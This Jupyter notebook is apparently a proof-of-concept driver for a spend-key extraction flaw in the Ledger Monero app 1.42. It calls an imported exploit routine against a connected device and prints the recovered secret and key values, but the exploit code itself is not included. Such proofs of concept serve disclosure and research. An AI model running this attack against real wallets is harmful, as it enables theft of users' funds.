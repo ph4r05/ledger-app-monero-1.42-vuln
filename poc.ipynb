{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true,
    "pycharm": {
     "is_executing": false
    }
   },
   "outputs": [],
   "source": [
    "from vuln.poc import *\n",
    "\n",
    "dongle = getDongle(False)\n",
    "poc = PoC(dongle)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "outputs": [
    {
     "name": "stdout",
     "text": [
      "[+] PoC Ledger-app-Monero 1.42 spend key extraction\n",
      "1. sec: b'88fac942ef2a636f10861131b9596e031ebde5fd1a4e3c90c84fbbf905264382'\n",
      "2. zero: b'4b8fe2ed890042af9c15de89f932f53ed11e5e06a82134145db9e0ac3e261e86'\n",
      "3. encr: b'431fde0a3c76e2a9e6a67fbcedc5c89a081d12ba179ffdc46410872e0aec6cb2'\n",
      "4. r: b'072a6937cc5436f8beaabeb9d83f47416f5e3ddbdd1814afa209a723f882620c'\n",
      "5. b: b'f7f9490af53bed2b5d1bafff5b3da5f0a56b3847a8402d2246ab391e14394f09'\n",
      "5. B: b'4e3e275ca2289bdfddcaa475552c8a5b6d8044112f9f31d393b96c45042f578b'\n",
      "6. bG: b'4e3e275ca2289bdfddcaa475552c8a5b6d8044112f9f31d393b96c45042f578b'\n"
     ],
     "output_type": "stream"
    }
   ],
   "source": [
    "poc.poc()"
   ],
   "metadata": {
    "collapsed": false,
    "pycharm": {
     "name": "#%%\n",
     "is_executing": false
    }
   }
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  },
  "pycharm": {
   "stem_cell": {
    "cell_type": "raw",
    "source": [],
    "metadata": {
     "collapsed": false
    }
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}